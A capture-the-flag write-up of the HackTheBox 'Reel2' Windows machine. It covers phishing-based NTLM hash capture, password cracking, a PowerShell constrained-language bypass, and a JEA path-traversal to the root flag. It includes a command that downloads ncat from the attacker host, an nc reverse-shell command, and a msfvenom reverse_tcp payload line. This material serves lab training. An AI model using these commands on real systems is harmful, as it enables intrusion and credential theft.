# Reel2 - Hard

### Initial nmap scan
Like any other windows box there are quite a lot of ports open, but most important ones are: 80 (Web), 443 (SSL) and 8080(Web)

### Initial recon for port 80
Well, here there isn't much because after a few tries I always ended up with 403. So I moved on.

### Initial recon for port 443 
Here I started gobuster using Seclists Discovery/Web-Content/raft-large-directories.txt and it imediatly hit with `owa` which stands for `Outlook web acess`. We have an attack surface but we don't have credentials so let's move on to the last port

### Initial recon for port 8080
Well here there is an web application installed, called `Wallstant`. At first I tried to look for CVEs but there is literally nothing on it. Than, I created an account and worked my way to understand how it works. I found that there are 6 featured users and 2 featured posts. The post created by sven contained a year and a season and seemed more fit for a password. So I tried `svensson:summer2020` and `svensson:Summer2020` and nope. Than I got the idea: All HackTheBox and in general all windows users have the same schema: `firstletter.lastname` And I tried `s.svensson:Summer2020` and it WORKED. Now we are in and..... we are trolled with Outlook set in Swedish... great.

### Getting the foothold
Now I switched back to port 433 and tried to find some emails, to recover the deleted ones or something that will help me get a step closer to user. But there was nothing. Than I tought to put a link inside an email and send that email to all. And it did hit after a few seconds `User-Agent: Mozilla/5.0 (Windows NT; Windows NT 6.3; en-US) WindowsPowerShell/5.1.14409.1018` disclosing the fact that is using `Powershell 5.1`. Now the only thing that comes into my mind is a `NTLM Relay Attack` so I fired up Responder and sent another email with my email. Bullseye. We did it, I save the Responder response at `responderCapture.txt`, extracted the hash into `chash` and fired up john to crack it. After no more than 3 seconds it cracked `kittycat1`. When we try to login using evil-winrm we are literally getting an error `The term 'Invoke-Expression' is not recognized as the name of a cmdlet, function, script file` from which we can't escape. 

### Getting the user 
I can't use evil-winrm and other alternatives I don't know... so I decided to install powershell on Linux using `apt -y install powershell`, aditionally I installed `apt install gss-ntlmssp`. Now to login use this sequence: 
```powershell
$password = ConvertTo-SecureString -AsPlainText -Force "kittycat1"
$cred= New-Object System.Management.Automation.PScredential -ArgumentList "htb\k.svensson", $password
enter-pssession -ComputerName 10.10.10.210 -Credential $cred -Authentication Negotiate
```
Here we are... now we should have user.... nope. From this point it got waaay to weird because I didn't saw that scenario before. I tried to check in which way powershell operates using `$ExecutionContext.SessionState.LanguageMode` which outputs `ConstrainedLanguage`. From here I got stuck for many hours and tried different things to bypass it but none worked, as a side note I struggled at this more than the whole root part. I got hinted, after a few hours of research and powershell learning, by TheCyberGeek who told me to use functions. From here the whole sky opened.

So in a few seconds after this I used: `function getText {Get-Content C:\Users\k.svensson\Desktop\user.txt}` and called it `getText` and it returned user flag. BINGO!
Now we also need a redundant shell so I used this sequence and got a shell ASAP
```powershell
function iwr{iwr http://10.10.14.24/ncat.exe -Outfile "C:\Users\k.svensson\Documents\nc.exe"}
function pwn{C:\Users\k.svensson\Documents\nc.exe -e cmd.exe 10.10.14.24 9001}
iwr
pwn
```

### Privesc to second user
This step was a lot of fun and interesting. All folders pointed to `StickyNotes.exe` so I started to dig into the filesystem to get more information about this. After a few files searched I found that it was about (Playork)[https://github.com/Playork/StickyNotes]'s project this. From here I looked deeper and deeper into the filesystem but there was nothing about the notes... so I tried to take a screenshot of the desktop. I created a meterpreter payload `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.24 LPORT=9001 -f exe -o shell.exe` and started the impacket's smb server. I copied the file with `powershell Copy-Item -Path \\10.10.14.4\zaBogdan\shell.exe -Destination .\shell.exe` and executed it. 

On the meterpreter shell I tried to use `screenshot` but it gave me this eror: `[-] Error running command screenshot: Rex::RuntimeError Current session was spawned by a service on Windows 8+. No desktops are available to screenshot.` so I migrated to stickynotes process using `migrate 6800`. Now it worked and got a screenshot of the desktop. And look at it there is a note with the credentials for jea_testing_account.

### Getting the root

Now I need to summon another powershell instance and login with jea. For this I used the following syntax and I started again to look over which contrains we are supposed.
```powershell
$password = ConvertTo-SecureString -AsPlainText -Force "Ab!Q@vcg^%@#1"
$cred= New-Object System.Management.Automation.PScredential -ArgumentList "htb\jea_test_account", $password
enter-pssession -ComputerName 10.10.10.210 -Credential $cred -Authentication Negotiate -configurationname jea_test_account
```
Well we can't even execute `$ExecutionContext.SessionState.LanguageMode` so I tried to `Get-Command *` and it poped up with `Check-File`. This is a custom made function which has been defined under `C:\Users\k.svensson\Documents\jea_testing_account.psrc` and it involves a `Get-Content` which can be easily travexec. So I got the root flag using `Check-File "C:\ProgramData\Mozilla\..\..\Users\Administrator\Desktop\root.txt"`

Pwned.

### Credentials
- htb\s.svensson:Summer2020 (Outlook, web)
- k.svensson:kittycat1(user)
- jea_test_account:Ab!Q@vcg^%@#1 (second user)